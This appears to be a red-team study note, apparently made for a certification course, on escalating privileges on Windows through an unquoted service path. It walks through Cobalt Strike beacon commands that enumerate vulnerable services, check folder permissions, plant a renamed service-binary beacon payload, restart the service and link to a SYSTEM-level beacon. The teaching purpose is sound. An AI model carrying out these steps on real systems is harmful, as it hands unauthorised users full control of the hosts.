An unquoted service path is where the path to the service binary is not wrapped in quotes. Why is that a problem? By itself it's not, but under specific conditions it can lead to an elevation of privilege.

### 🚀 - Enumeration
---
1. Using WMI:
`beacon> run wmic service get name, pathname`
```
Name                    PathName
ALG                     C:\Windows\System32\alg.exe
AppVClient              C:\Windows\system32\AppVClient.exe
Sense                   "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
[...snip...]
VulnService1            C:\Program Files\Vulnerable Services\Service 1.exe
```

We can see that the paths for ALG and AppVClient are not quoted, but the path for Sense is. The difference is that this latter path has _spaces_ in them. VulnService1 has spaces in the path _and_ is also not quoted - this is condition #1 for exploitation.

When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

If we can drop a binary into any of those paths, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them - this is condition #2.

Check writing permissions:

`beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl`

We need to see if the group we belong to can Create Files in the folder.

2) You can also use a tool like [SharpUp](https://github.com/GhostPack/SharpUp) for this:

`beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath`

Once you make sure you can write, generate a payload and drop it. 

### 📜 Payload Generation

In a tool like [[Cobalt Strike]] in order to abuse a service you must use "service binaries" for the payload, because they need to interact with the Service Control Manager.  When using the "Generate All Payloads" option, these have svc in the filename.   I recommend the use of TCP beacons (tcp-local_x64.svc.exe) bound to localhost only for privilege escalations. 

Create a [[Raw TCP Listener]] for this payload. 

### 📦 Payload Execution

When pasting the file into the victim, change its name accordingly to the service you want to replace.

```
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 290kb    fil     03/03/2021 11:11:27   Service.exe
```

Once uploaded, restart the service

```
beacon> run sc stop VulnService1

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

beacon> run sc start VulnService1
```

Standard users cannot stop or start services by default, so you would usually need to wait for a computer reboot.

When you start the service, you'll see its state will be **START_PENDING**.  If you then check its status with `sc query VulnService1`, you'll see it will be **STOPPED**.  This is by design.  You will also not see a Beacon appear in the UI automatically.  But you should see the port you used in your TCP listener configuration (in my case 4444) is now listening on 127.0.0.1.
```
beacon> run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
```

Then, connect to the listener:

```
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```
![[system-beacon.png]]

--- 

### Properties
---
📆 created   {{10-02-2024}} 12:07
🏷️ tags: #redteam #crto 

---
